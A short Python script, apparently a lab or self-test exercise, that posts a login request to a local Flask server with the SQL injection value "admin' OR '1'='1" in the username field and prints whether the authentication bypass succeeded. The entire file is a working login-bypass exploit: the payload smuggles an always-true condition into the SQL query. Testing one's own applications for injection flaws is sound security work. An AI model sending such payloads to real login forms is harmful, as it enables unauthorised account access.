import requests

# Flask server address 
# Might need to change this to the address of the serve
url = "http://127.0.0.1:5000/login"  

# SQL Injection
data = {
    "username": "admin' OR '1'='1",
    "password": "anypassword"
}

# Send post request
response = requests.post(url, data=data)

# Check if the response successed
if "Login successful!" in response.text:
    print("SQL Injection Successed.")
else:
    print("SQL Injection Failed.")
